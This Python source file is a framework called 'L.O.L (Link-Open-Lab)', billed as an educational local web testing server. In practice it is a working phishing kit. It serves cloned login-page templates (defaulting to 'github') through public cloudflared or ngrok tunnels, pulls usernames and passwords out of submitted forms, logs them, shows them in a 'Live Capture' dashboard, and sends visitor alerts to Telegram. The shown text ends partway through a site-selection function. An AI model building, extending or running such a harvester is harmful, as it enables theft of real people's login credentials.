#!/usr/bin/env python3
"""L.O.L (Link-Open-Lab) - Local Web Testing Server framework.

# Framework: L.O.L (Link-Open-Lab)
# Author: Abdalla Omran (@dx0rz)
# Purpose: Educational Security Research & Web Testing

Educational tool for local web app and form-processing tests:
- Uses asyncio to run PHP and cloudflared together.
- Serves templates from .sites with a generated runtime webroot.
- Logs incoming POST traffic for local form analysis.
- Sends server status and traffic alerts to Telegram.
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import json
import os
import re
import shutil
import signal
import subprocess
import sys
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Callable
from urllib.parse import parse_qsl

MISSING_DEPENDENCIES: list[str] = []

try:
    import httpx
except ModuleNotFoundError:
    httpx = None  # type: ignore[assignment]
    MISSING_DEPENDENCIES.append("httpx")

try:
    from aiohttp import web
except ModuleNotFoundError:
    web = None  # type: ignore[assignment]
    MISSING_DEPENDENCIES.append("aiohttp")

try:
    from rich.console import Console
    from rich.console import Group
    from rich.live import Live
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
except ModuleNotFoundError:
    Console = None  # type: ignore[assignment]
    Group = None  # type: ignore[assignment]
    Live = None  # type: ignore[assignment]
    Panel = None  # type: ignore[assignment]
    Table = None  # type: ignore[assignment]
    Text = None  # type: ignore[assignment]
    MISSING_DEPENDENCIES.append("rich")


ALLOWED_POST_KEYS = {"login", "user", "email", "pass", "password"}
USER_KEY_PATTERNS = ("user", "login", "email", "phone", "member", "id")
PASS_KEY_PATTERNS = ("pass", "pwd", "password")


def _can_use_sudo() -> bool:
    return shutil.which("sudo") is not None


def _is_root_user() -> bool:
    geteuid = getattr(os, "geteuid", None)
    if geteuid is None:
        return False
    return bool(geteuid() == 0)


def _with_privilege(command: list[str]) -> list[str]:
    if _is_root_user():
        return command
    if _can_use_sudo():
        return ["sudo", *command]
    return command


def _detect_package_manager() -> str | None:
    if shutil.which("apt"):
        return "apt"
    if shutil.which("dnf"):
        return "dnf"
    if shutil.which("pacman"):
        return "pacman"
    if shutil.which("brew"):
        return "brew"
    return None


def _run_install_command(command: list[str]) -> bool:
    try:
        subprocess.run(command, check=True)
        return True
    except Exception:
        return False


def _install_python_dependencies(workspace_root: Path) -> bool:
    requirements_file = workspace_root / "requirements.txt"
    if not requirements_file.exists():
        print(f"Missing requirements file: {requirements_file}")
        return False

    print("Installing missing Python dependencies...")
    command = [sys.executable, "-m", "pip", "install", "-r", str(requirements_file)]
    return _run_install_command(command)


def _install_system_package(package_manager: str, package_name: str) -> bool:
    if package_manager == "apt":
        return _run_install_command(_with_privilege(["apt", "install", "-y", package_name]))
    if package_manager == "dnf":
        return _run_install_command(_with_privilege(["dnf", "install", "-y", package_name]))
    if package_manager == "pacman":
        return _run_install_command(_with_privilege(["pacman", "-S", "--noconfirm", package_name]))
    if package_manager == "brew":
        return _run_install_command(["brew", "install", package_name])
    return False


def _print_manual_install_help() -> None:
    print("Could not auto-install all dependencies on this environment.")
    print("Install manually and run again:")
    print("  Python deps: python3 -m pip install -r requirements.txt")
    print("  Ubuntu/Debian: sudo apt install -y php-cli cloudflared")
    print("  Fedora/RHEL: sudo dnf install -y php-cli cloudflared")
    print("  Arch: sudo pacman -S php cloudflared")
    print("  macOS: brew install php cloudflared")


def ensure_startup_requirements(workspace_root: Path) -> tuple[int, bool]:
    """Ensure required dependencies are present before app startup.

    Returns:
        (exit_code, restart_required)
    """
    unique_missing = sorted(set(MISSING_DEPENDENCIES))
    if unique_missing:
        print(f"Missing Python dependencies detected: {', '.join(unique_missing)}")
        if not _install_python_dependencies(workspace_root):
            print("Failed to install Python dependencies automatically.")
            return 1, False
        print("Python dependencies installed. Restarting launcher...")
        return 0, True

    missing_required: list[str] = []
    missing_optional: list[str] = []

    if shutil.which("php") is None:
        missing_required.append("php")
    if shutil.which("cloudflared") is None:
        missing_optional.append("cloudflared")

    if not missing_required and not missing_optional:
        return 0, False

    package_manager = _detect_package_manager()
    if package_manager is None:
        if missing_required:
            print(f"Missing required system dependency: {', '.join(missing_required)}")
            _print_manual_install_help()
            return 1, False
        return 0, False

    if missing_required:
        print(f"Installing required system dependencies: {', '.join(missing_required)}")
        for dep in missing_required:
            package_name = "php-cli" if dep == "php" else dep
            if not _install_system_package(package_manager, package_name):
                print(f"Failed to auto-install required dependency: {dep}")
                _print_manual_install_help()
                return 1, False

    if missing_optional:
        print(f"Installing optional dependencies when available: {', '.join(missing_optional)}")
        for dep in missing_optional:
            if _install_system_package(package_manager, dep):
                print(f"Installed optional dependency: {dep}")
            else:
                print(f"Optional dependency not installed: {dep} (continuing in local-only mode)")

    return 0, False


def _extract_missing_executable_name(exc: FileNotFoundError) -> str:
    """Best-effort extraction of missing executable from FileNotFoundError."""
    if getattr(exc, "filename", None):
        return str(exc.filename)

    msg = str(exc)
    match = re.search(r"'([^']+)'", msg)
    if match:
        return match.group(1)
    return "required executable"


def print_missing_executable_help(console: Console | None, exc: FileNotFoundError) -> None:
    """Render actionable install instructions for common missing binaries."""
    executable = _extract_missing_executable_name(exc)
    ui = console or (Console() if Console is not None else None)

    if executable == "php":
        message = (
            "[bold red]Missing system dependency: php[/bold red]\n"
            "L.O.L requires PHP CLI to serve templates.\n\n"
            "Install it and run again:\n"
            "  Ubuntu/Debian: [yellow]sudo apt update && sudo apt install -y php-cli[/yellow]\n"
            "  Fedora/RHEL: [yellow]sudo dnf install -y php-cli[/yellow]\n"
            "  Arch: [yellow]sudo pacman -S php[/yellow]\n"
            "  macOS: [yellow]brew install php[/yellow]\n"
            "  Windows: install PHP and ensure [yellow]php[/yellow] is in PATH"
        )
    elif executable == "cloudflared":
        message = (
            "[bold red]Missing optional dependency: cloudflared[/bold red]\n"
            "Public tunnel mode will be disabled; local mode still works.\n\n"
            "Install cloudflared to enable public URLs:\n"
            "  Ubuntu/Debian: [yellow]sudo apt install -y cloudflared[/yellow]\n"
            "  macOS: [yellow]brew install cloudflared[/yellow]\n"
            "  Official: [yellow]https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/[/yellow]"
        )
    else:
        message = (
            f"[bold red]Missing dependency: {executable}[/bold red]\n"
            "Install the required executable and ensure it is available in PATH."
        )

    if ui is not None:
        ui.print(message)
    else:
        print(re.sub(r"\[[^\]]+\]", "", message))


def utc_now_iso() -> str:
    """Return UTC timestamp in ISO-8601 format with trailing Z."""
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def is_port_available(host: str, port: int) -> bool:
    import socket

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((host, port))
            return True
        except OSError:
            return False


def pick_available_port(host: str, preferred_port: int, search_span: int = 100) -> int:
    if is_port_available(host, preferred_port):
        return preferred_port

    for offset in range(1, search_span + 1):
        candidate = preferred_port + offset
        if candidate > 65535:
            break
        if is_port_available(host, candidate):
            return candidate

    raise ValueError(f"No available port found near {preferred_port} for host {host}")


def patch_legacy_templates(target_dir: str | Path) -> dict[str, int]:
    """Inject request logging hook and modernize legacy file writes in PHP templates.

    The patch is idempotent and only modifies files when needed.
    """
    base_dir = Path(target_dir).resolve()
    stats = {
        "scanned": 0,
        "patched": 0,
        "hook_injected": 0,
        "writes_rewired": 0,
        "errors": 0,
    }

    if not base_dir.exists() or not base_dir.is_dir():
        return stats

    hook_marker = "LOL_TRAFFIC_HOOK"
    hook_snippet = """\n/* LOL_TRAFFIC_HOOK */
if (!function_exists('lol_write_structured_log')) {
    function lol_write_structured_log($payload) {
        // Logging is handled by Python proxy to keep NDJSON format consistent.
        return;
    }
}
"""

    php_start_tag_pattern = r"<\?(?:php\b)?(?![=])"

    def _read_text_with_fallback(path: Path) -> tuple[str, str]:
        raw = path.read_bytes()
        for encoding in ("utf-8", "utf-8-sig", "latin-1"):
            try:
                return raw.decode(encoding), encoding
            except UnicodeDecodeError:
                continue
        return raw.decode("utf-8", errors="replace"), "utf-8"

    def _rewrite_file_put_contents(match: re.Match[str]) -> str:
        return match.group(0)

    file_put_contents_pattern = re.compile(
        r"""
        \bfile_put_contents\s*\(
            \s*(?P<filename>['\"][^'\"]+['\"])\s*,
            \s*(?P<payload>(?:[^)(]|\([^)]*\))+?)
            (?:\s*,\s*(?P<options>[^)]*?))?
        \)\s*;
        """,
        re.IGNORECASE | re.VERBOSE | re.DOTALL,
    )

    for root, _, files in os.walk(base_dir):
        for name in files:
            if not name.lower().endswith(".php"):
                continue

            stats["scanned"] += 1
            path = Path(root) / name

            try:
                original_text, encoding = _read_text_with_fallback(path)
            except OSError:
                stats["errors"] += 1
                continue

            updated_text = original_text
            file_changed = False

            if hook_marker not in updated_text and re.search(php_start_tag_pattern, updated_text, flags=re.IGNORECASE):
                updated_text, inject_count = re.subn(
                    php_start_tag_pattern,
                    lambda m: f"{m.group(0)}{hook_snippet}",
                    updated_text,
                    count=1,
                    flags=re.IGNORECASE,
                )
                if inject_count:
                    stats["hook_injected"] += 1
                    file_changed = True

            if "lol_write_structured_log" in updated_text:
                updated_text, replace_count = file_put_contents_pattern.subn(_rewrite_file_put_contents, updated_text)
                if replace_count:
                    stats["writes_rewired"] += replace_count
                    file_changed = True

            if not file_changed:
                continue

            try:
                path.write_text(updated_text, encoding=encoding)
                stats["patched"] += 1
            except OSError:
                stats["errors"] += 1

    return stats


@dataclass(slots=True)
class AppConfig:
    workspace_root: Path
    sites_dir: Path
    runtime_dir: Path
    runtime_webroot: Path
    auth_dir: Path
    selected_site: str
    php_host: str
    php_port: int
    monitor_host: str
    monitor_port: int
    traffic_log_file: Path
    cloudflared_url: str | None
    cloudflared_path: Path | None
    ngrok_enabled: bool
    cloudflared_enabled: bool
    ngrok_path: Path | None
    telegram_bot_token: str | None
    telegram_chat_id: str | None
    php_router: str | None

    @property
    def backend_url(self) -> str:
        return f"http://{self.php_host}:{self.php_port}"

    @property
    def monitor_url(self) -> str:
        return f"http://{self.monitor_host}:{self.monitor_port}"

    @property
    def tunnel_target_url(self) -> str:
        return self.cloudflared_url or self.monitor_url

    @property
    def telegram_enabled(self) -> bool:
        return bool(self.telegram_bot_token and self.telegram_chat_id)


@dataclass(slots=True)
class AppState:
    started_at: str
    active_site: str
    post_count: int = 0
    last_post_at: str | None = None
    php_running: bool = False
    cloudflared_running: bool = False
    ngrok_running: bool = False
    monitor_running: bool = False
    access_mode: str = "Local Access Only"
    external_access_url: str = "Local Access Only"
    tunnel_provider: str = "none"


class RichUI:
    """Render L.O.L themed CLI components."""

    def __init__(self) -> None:
        if Console is None:
            raise RuntimeError("Rich is not available. Install dependencies from requirements.txt.")
        self.console = Console()

    def banner(self) -> Panel:
        ascii_banner = Text(
            """
 _      ____   _      
| |    / __ \\ | |     
| |   | |  | || |     
| |   | |  | || |     
| |___| |__| || |____ 
|______\\____/ |______|
Link-Open-Lab | by Abdalla Omran
""".strip("\n"),
            style="bold cyan",
        )
        title = Text("L.O.L - Local Web Testing Server", style="bold magenta")
        return Panel(ascii_banner, title=title, border_style="magenta")

    def dashboard(self, config: AppConfig, state: AppState) -> Table:
        table = Table(title="Server Dashboard", title_style="bold cyan")
        table.add_column("Item", style="cyan", justify="left")
        table.add_column("Value", style="magenta", justify="left")

        table.add_row("Local URL", config.monitor_url)
        table.add_row("PHP Backend", config.backend_url)
        table.add_row("External URL", state.external_access_url)
        table.add_row("Tunnel Provider", state.tunnel_provider)
        table.add_row("Access Mode", state.access_mode)
        table.add_row("Active Template", state.active_site)
        table.add_row("Runtime Webroot", str(config.runtime_webroot))
        table.add_row("cloudflared", "running" if state.cloudflared_running else "stopped")
        table.add_row("ngrok", "running" if state.ngrok_running else "stopped")
        table.add_row("PHP Process", "running" if state.php_running else "stopped")
        table.add_row("Traffic Monitor", "running" if state.monitor_running else "stopped")
        table.add_row("POST Requests", str(state.post_count))
        table.add_row("Last POST", state.last_post_at or "none")
        table.add_row("Log File", str(config.traffic_log_file))
        table.add_row("Started At (UTC)", state.started_at)
        return table


class TrafficMonitor:
    """Persist POST traffic snapshots as NDJSON records."""

    def __init__(self, output_file: Path, source_folder: str) -> None:
        self.output_file = output_file
        self.source_folder = source_folder
        self._lock = asyncio.Lock()

    async def initialize(self) -> None:
        self.output_file.parent.mkdir(parents=True, exist_ok=True)
        await asyncio.to_thread(self.output_file.write_text, "", "utf-8")

    async def log_post(self, event: dict[str, Any]) -> None:
        event.setdefault("site", self.source_folder)
        async with self._lock:
            await asyncio.to_thread(self._append_event, event)

    def _append_event(self, event: dict[str, Any]) -> None:
        line = json.dumps(event, ensure_ascii=False)
        with self.output_file.open("a", encoding="utf-8") as handle:
            handle.write(line)
            handle.write("\n")

    def count_post_key_entries(self) -> int:
        """Count valid NDJSON records that contain captured user/pass data."""
        if not self.output_file.exists():
            return 0

        count = 0
        with self.output_file.open("r", encoding="utf-8", errors="replace") as handle:
            for raw_line in handle:
                line = raw_line.strip()
                if not line:
                    continue
                try:
                    record = json.loads(line)
                except json.JSONDecodeError:
                    continue
                if not isinstance(record, dict):
                    continue
                user_value = str(record.get("user", "")).strip()
                pass_value = str(record.get("pass", "")).strip()
                if user_value or pass_value:
                    count += 1
        return count

    def scan_for_dashboard_updates(self, since_line: int) -> tuple[int, int, list[dict[str, str]]]:
        """Return total lines, post-key count, and credential alerts from new lines."""
        if not self.output_file.exists():
            return 0, 0, []

        total_lines = 0
        post_count = 0
        alerts: list[dict[str, str]] = []

        with self.output_file.open("r", encoding="utf-8", errors="replace") as handle:
            for raw_line in handle:
                total_lines += 1
                line = raw_line.strip()
                if not line:
                    continue

                try:
                    record = json.loads(line)
                except json.JSONDecodeError:
                    continue

                if not isinstance(record, dict):
                    continue

                user_value = str(record.get("user", "")).strip()
                pass_value = str(record.get("pass", "")).strip()
                site_value = str(record.get("site", "unknown")).strip()

                if not user_value and not pass_value:
                    continue

                post_count += 1
                if total_lines <= since_line:
                    continue

                alerts.append(
                    {
                        "timestamp": str(record.get("timestamp", utc_now_iso())),
                        "source": site_value or "unknown",
                        "username": user_value or "-",
                        "password": pass_value or "-",
                    }
                )

        return total_lines, post_count, alerts


class TelegramNotifier:
    """Send status and traffic alerts to Telegram Bot API."""

    def __init__(self, bot_token: str | None, chat_id: str | None) -> None:
        self.bot_token = bot_token
        self.chat_id = chat_id

    @property
    def enabled(self) -> bool:
        return bool(self.bot_token and self.chat_id)

    async def send_message(self, text: str) -> None:
        if not self.enabled:
            return
        if httpx is None:
            return
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "disable_web_page_preview": True,
        }
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                await client.post(url, json=payload)
        except Exception:
            # Keep tool resilient even when Telegram network calls fail.
            return


class ProcessManager:
    """Manage long-running subprocesses with asyncio."""

    def __init__(self, console: Console) -> None:
        self.console = console
        self.processes: dict[str, asyncio.subprocess.Process] = {}
        self.log_tasks: list[asyncio.Task[None]] = []
        self.log_hooks: dict[str, Callable[[str, str], None]] = {}
        self.echo_logs: dict[str, bool] = {}

    async def start(
        self,
        name: str,
        *args: str,
        cwd: Path | None = None,
        log_hook: Callable[[str, str], None] | None = None,
        echo_logs: bool = True,
    ) -> None:
        process = await asyncio.create_subprocess_exec(
            *args,
            cwd=str(cwd) if cwd else None,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        self.processes[name] = process
        self.echo_logs[name] = echo_logs
        if log_hook is not None:
            self.log_hooks[name] = log_hook
        self.log_tasks.append(asyncio.create_task(self._stream_logs(name, process.stdout, "stdout")))
        self.log_tasks.append(asyncio.create_task(self._stream_logs(name, process.stderr, "stderr")))

    async def _stream_logs(
        self,
        name: str,
        stream: asyncio.StreamReader | None,
        stream_type: str,
    ) -> None:
        if stream is None:
            return
        while not stream.at_eof():
            line = await stream.readline()
            if not line:
                break
            msg = line.decode(errors="replace").rstrip()
            if msg:
                hook = self.log_hooks.get(name)
                if hook is not None:
                    try:
                        hook(stream_type, msg)
                    except Exception:
                        pass

                if self.echo_logs.get(name, True):
                    style = "cyan" if stream_type == "stdout" else "magenta"
                    self.console.print(f"[{style}][{name}:{stream_type}] {msg}[/{style}]")

    async def wait_for_any_exit(self) -> tuple[str, int]:
        waiters: dict[asyncio.Task[int], str] = {}
        for name, process in self.processes.items():
            waiters[asyncio.create_task(process.wait())] = name

        done, pending = await asyncio.wait(waiters.keys(), return_when=asyncio.FIRST_COMPLETED)
        for task in pending:
            task.cancel()

        finished_task = done.pop()
        exit_code = finished_task.result()
        return waiters[finished_task], exit_code

    async def terminate_all(self) -> None:
        for process in self.processes.values():
            if process.returncode is None:
                process.terminate()

        await asyncio.sleep(0.2)

        for process in self.processes.values():
            if process.returncode is None:
                process.kill()

        for task in self.log_tasks:
            task.cancel()


class LocalProxyServer:
    """Proxy requests to PHP backend and inspect incoming traffic."""

    def __init__(
        self,
        config: AppConfig,
        state: AppState,
        monitor: TrafficMonitor,
        notifier: TelegramNotifier,
    ) -> None:
        self.config = config
        self.state = state
        self.monitor = monitor
        self.notifier = notifier
        self.runner: web.AppRunner | None = None

    async def start(self) -> None:
        if web is None:
            raise RuntimeError("aiohttp is not available. Install dependencies from requirements.txt.")
        app = web.Application()
        app.router.add_route("*", "/{tail:.*}", self._handle)
        self.runner = web.AppRunner(app)
        await self.runner.setup()
        site = web.TCPSite(self.runner, host=self.config.monitor_host, port=self.config.monitor_port)
        await site.start()
        self.state.monitor_running = True

    async def stop(self) -> None:
        if self.runner:
            await self.runner.cleanup()
        self.state.monitor_running = False

    async def _handle(self, request: web.Request) -> web.StreamResponse:
        path_qs = request.rel_url.path_qs
        url = f"{self.config.backend_url}{path_qs}"
        body = await request.read()

        headers = dict(request.headers)
        headers.pop("Host", None)

        if request.method.upper() == "POST":
            await self._record_post(request, body)

        async with httpx.AsyncClient(follow_redirects=False, timeout=20.0) as client:
            backend_response = await client.request(
                request.method,
                url,
                headers=headers,
                params=request.query,
                content=body,
            )

        response_headers = {
            key: value
            for key, value in backend_response.headers.items()
            if key.lower() not in {"content-encoding", "transfer-encoding", "connection"}
        }

        return web.Response(
            status=backend_response.status_code,
            headers=response_headers,
            body=backend_response.content,
        )

    async def _record_post(self, request: web.Request, body: bytes) -> None:
        self.state.last_post_at = utc_now_iso()

        try:
            body_text = body.decode("utf-8")
            body_encoding = "utf-8"
        except UnicodeDecodeError:
            body_text = base64.b64encode(body).decode("ascii")
            body_encoding = "base64"

        post_fields: dict[str, str] = {}
        if body_encoding == "utf-8":
            try:
                parsed_json = json.loads(body_text)
                if isinstance(parsed_json, dict):
                    post_fields = {str(k): str(v) for k, v in parsed_json.items()}
            except json.JSONDecodeError:
                try:
                    post_fields = {str(k): str(v) for k, v in parse_qsl(body_text, keep_blank_values=True)}
                except Exception:
                    post_fields = {}

        filtered_post = {
            key.lower(): value
            for key, value in post_fields.items()
            if key.lower() in ALLOWED_POST_KEYS
        }

        username = ""
        password = ""
        normalized = {str(k).lower(): str(v).strip() for k, v in post_fields.items()}

        for key, value in normalized.items():
            if not username and any(pattern in key for pattern in USER_KEY_PATTERNS) and value:
                username = value
            if not password and any(pattern in key for pattern in PASS_KEY_PATTERNS) and value:
                password = value

        if not username and "user" in filtered_post:
            username = str(filtered_post.get("user", "")).strip()
        if not username and "login" in filtered_post:
            username = str(filtered_post.get("login", "")).strip()
        if not username and "email" in filtered_post:
            username = str(filtered_post.get("email", "")).strip()

        if not password and "password" in filtered_post:
            password = str(filtered_post.get("password", "")).strip()
        if not password and "pass" in filtered_post:
            password = str(filtered_post.get("pass", "")).strip()

        # Keep the log compact: skip noisy entries that don't contain credentials.
        if not username and not password:
            return

        event = {
            "timestamp": self.state.last_post_at,
            "site": self.monitor.source_folder,
            "user": username,
            "pass": password,
        }

        await self.monitor.log_post(event)
        self.state.post_count = await asyncio.to_thread(self.monitor.count_post_key_entries)

        await self.notifier.send_message(
            "\n".join(
                [
                    "L.O.L Traffic Alert",
                    f"POST #{self.state.post_count}",
                    f"Path: {request.rel_url.path_qs}",
                    f"From: {request.remote}",
                    f"At: {self.state.last_post_at}",
                ]
            )
        )


class LocalWebTestingServer:
    """Top-level orchestration for L.O.L."""

    def __init__(self, config: AppConfig) -> None:
        self.config = config
        self.ui = RichUI()
        self.state = AppState(started_at=utc_now_iso(), active_site=config.selected_site)
        self.monitor = TrafficMonitor(config.traffic_log_file, config.selected_site)
        self.notifier = TelegramNotifier(config.telegram_bot_token, config.telegram_chat_id)
        self.process_manager = ProcessManager(self.ui.console)
        self.proxy = LocalProxyServer(config, self.state, self.monitor, self.notifier)
        self.shutdown_event = asyncio.Event()
        self._processed_log_lines = 0
        self._cloudflared_url_pattern = re.compile(r"https://[a-zA-Z0-9.-]+\.trycloudflare\.com")
        self._ngrok_url_pattern = re.compile(r"https://[a-zA-Z0-9.-]+\.ngrok(?:-free)?\.app")

    async def run(self) -> None:
        self.config.runtime_dir.mkdir(parents=True, exist_ok=True)
        self.config.auth_dir.mkdir(parents=True, exist_ok=True)
        await self.monitor.initialize()
        self._processed_log_lines = 0

        self.ui.console.print(self.ui.banner())
        await self.notifier.send_message(
            "\n".join(
                [
                    "L.O.L Server Status",
                    "Status: STARTED",
                    f"Template: {self.config.selected_site}",
                    f"Monitor URL: {self.config.monitor_url}",
                    f"PHP Backend: {self.config.backend_url}",
                ]
            )
        )

        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, self.shutdown_event.set)
            except NotImplementedError:
                pass

        await self._start_services()

        dashboard_task = asyncio.create_task(self._dashboard_loop())
        process_watch_task = asyncio.create_task(self._watch_subprocesses())
        shutdown_wait_task = asyncio.create_task(self.shutdown_event.wait())

        done, pending = await asyncio.wait(
            {dashboard_task, process_watch_task, shutdown_wait_task},
            return_when=asyncio.FIRST_COMPLETED,
        )

        for task in pending:
            task.cancel()

        for task in done:
            if task is process_watch_task and not task.cancelled() and task.exception() is None:
                reason = task.result()
                self.ui.console.print(f"[magenta]{reason}[/magenta]")

        await self._stop_services()
        await self.notifier.send_message("L.O.L Server Status\nStatus: STOPPED")

    async def _start_services(self) -> None:
        php_args = [
            "php",
            "-S",
            f"{self.config.php_host}:{self.config.php_port}",
            "-t",
            str(self.config.runtime_webroot),
        ]
        if self.config.php_router:
            php_args.append(self.config.php_router)

        await self.process_manager.start("php", *php_args, cwd=self.config.workspace_root)
        self.state.php_running = True

        await self.proxy.start()
        self.state.access_mode = "Local Access Only"
        self.state.external_access_url = "Local Access Only"
        self.state.tunnel_provider = "none"

        if self.config.ngrok_enabled:
            if self.config.ngrok_path is None:
                self.ui.console.print(
                    "[magenta]ngrok flag enabled but ngrok binary was not found in PATH. "
                    "Install ngrok to use public tunnel mode. Continuing in local-only mode.[/magenta]"
                )
                self.state.ngrok_running = False
                return

            self.state.access_mode = "Public Bridge Starting"
            self.state.external_access_url = "Waiting for ngrok URL..."
            self.state.tunnel_provider = "ngrok"

            # Route ngrok through the monitor proxy so POST capture/dashboard stays functional.
            ngrok_target = self.config.tunnel_target_url
            ngrok_args = [
                str(self.config.ngrok_path),
                "http",
                ngrok_target,
                "--log",
                "stdout",
            ]
            await self.process_manager.start(
                "ngrok",
                *ngrok_args,
                cwd=self.config.workspace_root,
                log_hook=self._handle_ngrok_log,
                echo_logs=True,
            )
            self.state.ngrok_running = True
            self.ui.console.print("[cyan]ngrok tunnel starting (may take a moment to stabilize)...[/cyan]")
            return

        if not self.config.cloudflared_enabled:
            self.ui.console.print("[magenta]No public tunnel selected. Local Access Only mode is active.[/magenta]")
            self.state.cloudflared_running = False
            return

        if self.config.cloudflared_path is None:
            self.ui.console.print(
                "[magenta]cloudflared not found. Local Access Only. Install with 'sudo apt install cloudflared' "
                "or from the official cloudflared .deb package.[/magenta]"
            )
            self.state.cloudflared_running = False
            return

        self.state.access_mode = "Public Bridge Starting"
        self.state.external_access_url = "Waiting for trycloudflare URL..."

        cloudflared_args = [
            str(self.config.cloudflared_path),
            "tunnel",
            "--url",
            self.config.tunnel_target_url,
        ]
        await self.process_manager.start(
            "cloudflared",
            *cloudflared_args,
            cwd=self.config.workspace_root,
            log_hook=self._handle_cloudflared_log,
            echo_logs=True,
        )
        self.state.cloudflared_running = True
        self.state.tunnel_provider = "cloudflared"
        self.ui.console.print("[cyan]Cloudflared tunnel starting (may take a moment to stabilize)...[/cyan]")

    def _handle_cloudflared_log(self, stream_type: str, line: str) -> None:
        match = self._cloudflared_url_pattern.search(line)
        if not match:
            return

        url = match.group(0)
        if self.state.external_access_url == url:
            return

        self.state.external_access_url = url
        self.state.access_mode = "Public Bridge Active"
        self.state.tunnel_provider = "cloudflared"
        self.ui.console.print(f"[bold green]✓ Cloudflare Tunnel Ready: {url}[/bold green]")

    def _handle_ngrok_log(self, stream_type: str, line: str) -> None:
        match = self._ngrok_url_pattern.search(line)
        if not match:
            return

        url = match.group(0)
        if self.state.external_access_url == url:
            return

        self.state.external_access_url = url
        self.state.access_mode = "Public Bridge Active"
        self.state.tunnel_provider = "ngrok"
        self.ui.console.print(f"[bold green]✓ ngrok Tunnel Ready: {url}[/bold green]")

    async def _stop_services(self) -> None:
        self.state.php_running = False
        self.state.cloudflared_running = False
        self.state.ngrok_running = False
        self.state.monitor_running = False
        await self.proxy.stop()
        await self.process_manager.terminate_all()

    async def _dashboard_loop(self) -> None:
        recent_alerts: list[dict[str, str]] = []

        def render() -> Any:
            dashboard = self.ui.dashboard(self.config, self.state)
            if not recent_alerts:
                panel = Panel(
                    "Waiting for credential captures...",
                    title="Live Capture",
                    border_style="cyan",
                )
            else:
                rows = []
                for alert in recent_alerts[-6:]:
                    rows.append(
                        " | ".join(
                            [
                                f"Site: {alert['source']}",
                                f"User: {alert['username']}",
                                f"Pass: {alert['password']}",
                                f"Time: {alert['timestamp']}",
                            ]
                        )
                    )
                panel = Panel(
                    "\n".join(rows),
                    title="Live Capture",
                    border_style="magenta",
                )
            return Group(dashboard, panel)

        with Live(
            render(),
            refresh_per_second=6,
            console=self.ui.console,
        ) as live:
            while not self.shutdown_event.is_set():
                total_lines, post_count, alerts = await asyncio.to_thread(
                    self.monitor.scan_for_dashboard_updates,
                    self._processed_log_lines,
                )
                self._processed_log_lines = total_lines
                self.state.post_count = post_count

                if alerts:
                    recent_alerts.extend(alerts)
                    if len(recent_alerts) > 20:
                        recent_alerts = recent_alerts[-20:]

                live.update(render())
                await asyncio.sleep(0.25)

    async def _watch_subprocesses(self) -> str:
        proc_name, code = await self.process_manager.wait_for_any_exit()
        self.shutdown_event.set()

        if proc_name == "php":
            self.state.php_running = False
        if proc_name == "cloudflared":
            self.state.cloudflared_running = False
            self.state.tunnel_provider = "none"
            self.state.access_mode = "Local Access Only"
            if not self.state.external_access_url.startswith("http"):
                self.state.external_access_url = "Local Access Only"
        if proc_name == "ngrok":
            self.state.ngrok_running = False
            self.state.tunnel_provider = "none"
            self.state.access_mode = "Local Access Only"
            if not self.state.external_access_url.startswith("http"):
                self.state.external_access_url = "Local Access Only"

        return f"Process '{proc_name}' exited with code {code}. Initiating shutdown."


class CloudflaredResolver:
    """Resolve cloudflared path with graceful fallback logic."""

    @staticmethod
    def resolve(workspace_root: Path) -> Path | None:
        candidates = [
            Path("/usr/local/bin/cloudflared"),
            workspace_root / "cloudflared",
            workspace_root / ".server" / "cloudflared",
        ]

        which_match = shutil.which("cloudflared")
        if which_match:
            candidates.insert(0, Path(which_match))

        for candidate in candidates:
            if candidate.exists() and candidate.is_file():
                if os.access(candidate, os.X_OK):
                    return candidate

        return None


class NgrokResolver:
    """Resolve ngrok path with graceful fallback logic."""

    @staticmethod
    def resolve(workspace_root: Path) -> Path | None:
        candidates = [
            Path("/usr/local/bin/ngrok"),
            workspace_root / "ngrok",
            workspace_root / ".server" / "ngrok",
        ]

        which_match = shutil.which("ngrok")
        if which_match:
            candidates.insert(0, Path(which_match))

        for candidate in candidates:
            if candidate.exists() and candidate.is_file():
                if os.access(candidate, os.X_OK):
                    return candidate

        return None


class SiteLibrary:
    """Load templates from .sites and publish a runtime PHP webroot."""

    def __init__(self, sites_dir: Path, runtime_webroot: Path) -> None:
        self.sites_dir = sites_dir
        self.runtime_webroot = runtime_webroot

    def list_sites(self) -> list[str]:
        if not self.sites_dir.exists():
            return []
        names = [entry.name for entry in self.sites_dir.iterdir() if entry.is_dir()]
        return sorted(names)

    def resolve_site(self, preferred_site: str | None) -> str:
        sites = self.list_sites()
        if not sites:
            raise FileNotFoundError(f"No site templates found in {self.sites_dir}")

        if preferred_site:
            if preferred_site not in sites:
                available = ", ".join(sites)
                raise ValueError(f"Unknown site '{preferred_site}'. Available: {available}")
            return preferred_site

        if "github" in sites:
            return "github"

        return sites[0]

    def publish_runtime_site(self, site_name: str) -> None:
        source_site = self.sites_dir / site_name
        if not source_site.exists() or not source_site.is_dir():
            raise FileNotFoundError(f"Site template not found: {source_site}")

        if self.runtime_webroot.exists():
            shutil.rmtree(self.runtime_webroot)
        self.runtime_webroot.mkdir(parents=True, exist_ok=True)

        for item in source_site.iterdir():
            dest = self.runtime_webroot / item.name
            if item.is_dir():
                shutil.copytree(item, dest)
            else:
                shutil.copy2(item, dest)

        shared_ip_script = self.sites_dir / "ip.php"
        if shared_ip_script.exists() and shared_ip_script.is_file():
            shutil.copy2(shared_ip_script, self.runtime_webroot / "ip.php")


def choose_site_interactive(site_library: SiteLibrary, console: Console) -> str:
    """Interactive terminal menu for site selection using simple numbered input."""
    sites = site_library.list_sites()
    if not sites:
        raise FileNotFoundError(f"No site templates found in {site_library.sites_dir}")

    if not sys.stdin.isatty() or not sys.stdout.isatty():
        return site_library.resolve_site(None)

